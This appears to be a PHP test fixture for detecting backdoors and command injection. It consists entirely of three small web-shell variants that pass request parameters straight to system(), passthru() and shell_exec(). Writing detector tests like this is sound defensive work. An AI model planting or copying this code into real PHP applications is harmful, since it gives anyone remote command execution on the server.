<?php
// TEST FILE: PHP Shell execution backdoor
// This should trigger: php_backdoor, php_injection detectors

if(isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}

// Passthru variant
passthru($_GET['command']);

// Shell_exec variant
echo shell_exec($_POST['x']);
?>
